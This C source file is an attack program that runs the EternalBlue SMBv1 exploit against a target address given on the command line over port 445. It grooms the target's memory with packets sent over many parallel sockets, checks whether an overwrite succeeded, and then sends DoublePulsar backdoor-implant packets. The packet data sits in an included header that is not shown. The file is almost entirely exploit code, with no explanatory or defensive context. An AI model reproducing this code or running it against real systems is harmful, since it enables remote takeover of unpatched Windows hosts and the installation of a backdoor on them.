#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <tchar.h>
#pragma comment(lib, "wsock32.lib")
#include "Eternalblue.h"

unsigned char recvbuff[2048];
int main(int argc, char** argv)
{
	WSADATA    ws;
	struct sockaddr_in server;
	SOCKET s1, s2, s3, s4, s5, s6, s7, s8, s9, s10, s11, s12, s13, s14, s15, s16, s17, s18, s19, s20, s21;

	char userid[2];
	char treeid[2];
	 /*
	 	//copy userID from recvbuff @ 32,33
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];

	//update userID in the tree connect request
	request[32] = userid[0];
	request[33] = userid[1];

	//copy treeID from recvbuff @ 28, 29
	treeid[0] = recvbuff[28];
	treeid[1] = recvbuff[29];

	request[28] = treeid[0];
	request[29] = treeid[1];
	request[32] = userid[0];
	request[33] = userid[1];

	*/

	WSAStartup(MAKEWORD(2, 2), &ws);
	s1 = socket(AF_INET, SOCK_STREAM, 0);
	s2 = socket(AF_INET, SOCK_STREAM, 0);
	s3 = socket(AF_INET, SOCK_STREAM, 0);
	s4 = socket(AF_INET, SOCK_STREAM, 0);

	s5 = socket(AF_INET, SOCK_STREAM, 0);
	s6 = socket(AF_INET, SOCK_STREAM, 0);
	s7 = socket(AF_INET, SOCK_STREAM, 0);
	s8 = socket(AF_INET, SOCK_STREAM, 0);
	s9 = socket(AF_INET, SOCK_STREAM, 0);
	s10 = socket(AF_INET, SOCK_STREAM, 0);
	s11 = socket(AF_INET, SOCK_STREAM, 0);
	s12 = socket(AF_INET, SOCK_STREAM, 0);

	s13 = socket(AF_INET, SOCK_STREAM, 0);
	s14 = socket(AF_INET, SOCK_STREAM, 0);
	s15 = socket(AF_INET, SOCK_STREAM, 0);
	s16 = socket(AF_INET, SOCK_STREAM, 0);

	s17 = socket(AF_INET, SOCK_STREAM, 0);
	s18 = socket(AF_INET, SOCK_STREAM, 0);
	s19 = socket(AF_INET, SOCK_STREAM, 0);
	s20 = socket(AF_INET, SOCK_STREAM, 0);
	s21 = socket(AF_INET, SOCK_STREAM, 0);
	
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_port = htons((USHORT)445);
	
	connect(s1, (struct sockaddr*) & server, sizeof(server));

	//send negociation
	send(s1, (char*)smbnegociate, sizeof(smbnegociate) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s1, (char*)session_setup, sizeof(session_setup) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
	userid[0] = recvbuff[32];
	userid[1] = recvbuff[33];

	//update userID in the tree connect request
	treeconnect[32] = userid[0];
	treeconnect[33] = userid[1];

	send(s1, (char*)treeconnect, sizeof(treeconnect) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
	//copy treeID from recvbuff @ 28, 29
	treeid[0] = recvbuff[28];
	treeid[1] = recvbuff[29];

	send(s1, (char*)NTTrans, sizeof(NTTrans) - 1, 0);

	send(s1, (char*)NTTrans2, sizeof(NTTrans2) - 1, 0);

	send(s1, (char*)NTTrans3, sizeof(NTTrans3) - 1, 0);

	send(s1, (char*)NTTrans4, sizeof(NTTrans4) - 1, 0);

	send(s1, (char*)NTTrans5, sizeof(NTTrans5) - 1, 0);

	send(s1, (char*)NTTrans6, sizeof(NTTrans6) - 1, 0);

	send(s1, (char*)NTTrans7, sizeof(NTTrans7) - 1, 0);

	send(s1, (char*)NTTrans8, sizeof(NTTrans8) - 1, 0);

	send(s1, (char*)NTTrans9, sizeof(NTTrans9) - 1, 0);

	send(s1, (char*)NTTrans10, sizeof(NTTrans10) - 1, 0);

	send(s1, (char*)NTTrans11, sizeof(NTTrans11) - 1, 0);

	send(s1, (char*)NTTrans12, sizeof(NTTrans12) - 1, 0);

	send(s1, (char*)NTTrans13, sizeof(NTTrans13) - 1, 0);

	send(s1, (char*)NTTrans14, sizeof(NTTrans14) - 1, 0);

	send(s1, (char*)NTTrans15, sizeof(NTTrans15) - 1, 0);

	send(s1, (char*)NTTrans16, sizeof(NTTrans16) - 1, 0);

	send(s1, (char*)NTTrans17, sizeof(NTTrans17) - 1, 0);

	send(s1, (char*)NTTrans18, sizeof(NTTrans18) - 1, 0);

	send(s1, (char*)NTTrans19, sizeof(NTTrans19) - 1, 0);

	send(s1, (char*)NTTrans20, sizeof(NTTrans20) - 1, 0);

	send(s1, (char*)NTTrans21, sizeof(NTTrans21) - 1, 0);

	send(s1, (char*)NTTrans22, sizeof(NTTrans22) - 1, 0);

	send(s1, (char*)NTTrans23, sizeof(NTTrans23) - 1, 0);

	send(s1, (char*)NTTrans24, sizeof(NTTrans24) - 1, 0);

	send(s1, (char*)NTTrans25, sizeof(NTTrans25) - 1, 0);

	send(s1, (char*)NTTrans26, sizeof(NTTrans26) - 1, 0);

	send(s1, (char*)NTTrans27, sizeof(NTTrans27) - 1, 0);
	send(s1, (char*)NTTrans28, sizeof(NTTrans28) - 1, 0);

	send(s1, (char*)NTTrans29, sizeof(NTTrans29) - 1, 0);

	send(s1, (char*)NTTrans30, sizeof(NTTrans30) - 1, 0);

	send(s1, (char*)NTTrans31, sizeof(NTTrans31) - 1, 0);

	send(s1, (char*)NTTrans32, sizeof(NTTrans32) - 1, 0);

	send(s1, (char*)NTTrans33, sizeof(NTTrans33) - 1, 0);
	
	send(s1, (char*)NTTrans34, sizeof(NTTrans34) - 1, 0);

	send(s1, (char*)NTTrans35, sizeof(NTTrans35) - 1, 0);
	
	send(s1, (char*)NTTrans36, sizeof(NTTrans36) - 1, 0);

	send(s1, (char*)NTTrans37, sizeof(NTTrans37) - 1, 0);
	
	send(s1, (char*)NTTrans38, sizeof(NTTrans38) - 1, 0);
	send(s1, (char*)NTTrans39, sizeof(NTTrans39) - 1, 0);
	
	send(s1, (char*)NTTrans40, sizeof(NTTrans40) - 1, 0);
	
	send(s1, (char*)NTTrans41, sizeof(NTTrans41) - 1, 0);
	
	send(s1, (char*)NTTrans42, sizeof(NTTrans42) - 1, 0);
	
	send(s1, (char*)NTTrans43, sizeof(NTTrans43) - 1, 0);
	
	send(s1, (char*)NTTrans44, sizeof(NTTrans44) - 1, 0);

	send(s1, (char*)NTTrans45, sizeof(NTTrans45) - 1, 0);
	
	send(s1, (char*)NTTrans46, sizeof(NTTrans46) - 1, 0);

	send(s1, (char*)SmbEcho, sizeof(SmbEcho) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//connect to second socket
	connect(s2, (struct sockaddr*) & server, sizeof(server));
	send(s2, (char*)negociate2, sizeof(negociate2) - 1, 0);
	recv(s2, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s2, (char*)unknown_packet_socket2, sizeof(unknown_packet_socket2) - 1, 0);
	recv(s2, (char*)recvbuff, sizeof(recvbuff), 0);

	connect(s3, (struct sockaddr*) & server, sizeof(server));
	connect(s4, (struct sockaddr*) & server, sizeof(server));

	send(s3, (char*)unknown_packet_socket3, sizeof(unknown_packet_socket3) - 1, 0);
	
	connect(s5, (struct sockaddr*) & server, sizeof(server));

	send(s4, (char*)unknown_packet_socket4, sizeof(unknown_packet_socket4) - 1, 0);

	send(s5, (char*)unknown_packet_socket5, sizeof(unknown_packet_socket5) - 1, 0);

	connect(s6, (struct sockaddr*) & server, sizeof(server));
	send(s6, (char*)unknown_packet_socket5, sizeof(unknown_packet_socket5) - 1, 0);

	connect(s7, (struct sockaddr*) & server, sizeof(server));
	connect(s8, (struct sockaddr*) & server, sizeof(server));
	send(s7, (char*)unknown_packet_socket7, sizeof(unknown_packet_socket7) - 1, 0);

	send(s8, (char*)unknown_packet_socket8, sizeof(unknown_packet_socket8) - 1, 0);

	connect(s9, (struct sockaddr*) & server, sizeof(server));
	connect(s10, (struct sockaddr*) & server, sizeof(server));

	send(s9, (char*)unknown_packet_socket9, sizeof(unknown_packet_socket9) - 1, 0);
	send(s10, (char*)unknown_packet_socket10, sizeof(unknown_packet_socket10) - 1, 0);

	connect(s11, (struct sockaddr*) & server, sizeof(server));
	connect(s12, (struct sockaddr*) & server, sizeof(server));
	send(s11, (char*)unknown_packet_socket11, sizeof(unknown_packet_socket11) - 1, 0);

	connect(s13, (struct sockaddr*) & server, sizeof(server));

	send(s12, (char*)unknown_packet_socket12, sizeof(unknown_packet_socket12) - 1, 0);

	connect(s14, (struct sockaddr*) & server, sizeof(server));

	send(s13, (char*)unknown_packet_socket13, sizeof(unknown_packet_socket13) - 1, 0);
	
	connect(s15, (struct sockaddr*) & server, sizeof(server));

	send(s14, (char*)unknown_packet_socket14, sizeof(unknown_packet_socket14) - 1, 0);

	connect(s16, (struct sockaddr*) & server, sizeof(server));

	send(s15, (char*)unknown_packet_socket15, sizeof(unknown_packet_socket15) - 1, 0);

	send(s16, (char*)negociate_socket16, sizeof(negociate_socket16) - 1, 0);
	recv(s16, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s16, (char*)unknown_packet_socket16, sizeof(unknown_packet_socket16) - 1, 0);
	//get information
	recv(s16, (char*)recvbuff, sizeof(recvbuff), 0);

	closesocket(s2);

	connect(s17, (struct sockaddr*) & server, sizeof(server));
	send(s17, (char*)unknown_packet_socket17, sizeof(unknown_packet_socket17) - 1, 0);

	connect(s18, (struct sockaddr*) & server, sizeof(server));
	connect(s19, (struct sockaddr*) & server, sizeof(server));

	send(s18, (char*)unknown_packet_socket18, sizeof(unknown_packet_socket18) - 1, 0);

	connect(s20, (struct sockaddr*) & server, sizeof(server));
	send(s19, (char*)unknown_packet_socket19, sizeof(unknown_packet_socket19) - 1, 0);

	connect(s21, (struct sockaddr*) & server, sizeof(server));
	send(s20, (char*)unknown_packet_socket20, sizeof(unknown_packet_socket20) - 1, 0);
	send(s21, (char*)unknown_packet_socket21, sizeof(unknown_packet_socket21) - 1, 0);

	closesocket(s16);

	send(s1, (char*)smbecho_socket1, sizeof(smbecho_socket1) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	send(s1, (char*)last_eternalblue_packet, sizeof(last_eternalblue_packet) - 1, 0);
	send(s1, (char*)last_eternalblue_packet2, sizeof(last_eternalblue_packet2) - 1, 0);
	send(s1, (char*)last_eternalblue_packet3, sizeof(last_eternalblue_packet3) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);
	
	//check for EternalBlue overwrite in response packet
	if (recvbuff[9] == 0x05 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
	{
		printf("Got STATUS_INVALID_PARAMETER!  EternalBlue overwrite successful!\n");
	}
	
	//send doublepulsar packets
	send(s3, (char*)doublepulsar_packet_socket3, sizeof(doublepulsar_packet_socket3) - 1, 0);
	send(s3, (char*)doublepulsar_packet2_socket3, sizeof(doublepulsar_packet2_socket3) - 1, 0);

	send(s4, (char*)doublepulsar_packet_socket4, sizeof(doublepulsar_packet_socket4) - 1, 0);
	send(s4, (char*)doublepulsar_packet2_socket4, sizeof(doublepulsar_packet2_socket4) - 1, 0);

	send(s5, (char*)doublepulsar_packet_socket5, sizeof(doublepulsar_packet_socket5) - 1, 0);
	send(s5, (char*)doublepulsar_packet2_socket5, sizeof(doublepulsar_packet2_socket5) - 1, 0);

	send(s6, (char*)doublepulsar_packet_socket6, sizeof(doublepulsar_packet_socket6) - 1, 0);
	send(s6, (char*)doublepulsar_packet2_socket6, sizeof(doublepulsar_packet2_socket6) - 1, 0);
	send(s7, (char*)doublepulsar_packet_socket7, sizeof(doublepulsar_packet_socket7) - 1, 0);
	send(s7, (char*)doublepulsar_packet2_socket7, sizeof(doublepulsar_packet2_socket7) - 1, 0);
	send(s8, (char*)doublepulsar_packet_socket8, sizeof(doublepulsar_packet_socket8) - 1, 0);
	send(s8, (char*)doublepulsar_packet2_socket8, sizeof(doublepulsar_packet2_socket8) - 1, 0);
	send(s9, (char*)doublepulsar_packet_socket9, sizeof(doublepulsar_packet_socket9) - 1, 0);
	send(s9, (char*)doublepulsar_packet2_socket9, sizeof(doublepulsar_packet2_socket9) - 1, 0);
	send(s10, (char*)doublepulsar_packet_socket10, sizeof(doublepulsar_packet_socket10) - 1, 0);
	send(s10, (char*)doublepulsar_packet2_socket10, sizeof(doublepulsar_packet2_socket10) - 1, 0);
	send(s11, (char*)doublepulsar_packet_socket11, sizeof(doublepulsar_packet_socket11) - 1, 0);
	send(s11, (char*)doublepulsar_packet2_socket11, sizeof(doublepulsar_packet2_socket11) - 1, 0);
	send(s12, (char*)doublepulsar_packet_socket12, sizeof(doublepulsar_packet_socket12) - 1, 0);
	send(s12, (char*)doublepulsar_packet2_socket12, sizeof(doublepulsar_packet2_socket12) - 1, 0);
	send(s13, (char*)doublepulsar_packet_socket13, sizeof(doublepulsar_packet_socket13) - 1, 0);
	send(s13, (char*)doublepulsar_packet2_socket13, sizeof(doublepulsar_packet2_socket13) - 1, 0);
	send(s14, (char*)doublepulsar_packet_socket14, sizeof(doublepulsar_packet_socket14) - 1, 0);
	send(s14, (char*)doublepulsar_packet2_socket14, sizeof(doublepulsar_packet2_socket14) - 1, 0);
	send(s15, (char*)doublepulsar_packet_socket15, sizeof(doublepulsar_packet_socket15) - 1, 0);
	send(s15, (char*)doublepulsar_packet2_socket15, sizeof(doublepulsar_packet2_socket15) - 1, 0);

	send(s17, (char*)doublepulsar_packet_socket17, sizeof(doublepulsar_packet_socket17) - 1, 0);
	send(s17, (char*)doublepulsar_packet2_socket17, sizeof(doublepulsar_packet2_socket17) - 1, 0);
	send(s18, (char*)doublepulsar_packet_socket18, sizeof(doublepulsar_packet_socket18) - 1, 0);
	send(s18, (char*)doublepulsar_packet2_socket18, sizeof(doublepulsar_packet2_socket18) - 1, 0);
	send(s19, (char*)doublepulsar_packet_socket19, sizeof(doublepulsar_packet_socket19) - 1, 0);
	send(s19, (char*)doublepulsar_packet2_socket19, sizeof(doublepulsar_packet2_socket19) - 1, 0);
	send(s20, (char*)doublepulsar_packet_socket20, sizeof(doublepulsar_packet_socket20) - 1, 0);
	send(s20, (char*)doublepulsar_packet2_socket20, sizeof(doublepulsar_packet2_socket20) - 1, 0);

	send(s21, (char*)doublepulsar_packet_socket21, sizeof(doublepulsar_packet_socket21) - 1, 0);
	send(s21, (char*)doublepulsar_packet2_socket21, sizeof(doublepulsar_packet2_socket21) - 1, 0);

	//send doublepulsar packets
	send(s3, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s4, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s5, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s6, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s7, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s8, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s9, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s10, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s11, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s12, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s13, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s14, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s15, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	//closed socket 16 already
	send(s17, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s18, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s19, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s20, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);
	send(s21, (char*)doublepulsar_pkt, sizeof(doublepulsar_pkt) - 1, 0);

	//mass close sockets
	closesocket(s3);
	closesocket(s4);
	closesocket(s5);
	closesocket(s6);
	closesocket(s7);
	closesocket(s8);
	closesocket(s9);
	closesocket(s10);
	closesocket(s11);
	closesocket(s12);
	closesocket(s13);
	closesocket(s14);
	closesocket(s15);
	closesocket(s17);

	//send disconnect
	send(s1, (char*)disconnect, sizeof(disconnect) - 1, 0);

	closesocket(s18);
	closesocket(s19);
	closesocket(s20);
	closesocket(s21);

	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//send logoff
	send(s1, (char*)logoff, sizeof(logoff) - 1, 0);
	recv(s1, (char*)recvbuff, sizeof(recvbuff), 0);

	//close first socket
	closesocket(s1);

	//cleanup
	WSACleanup();
	return 0;
}
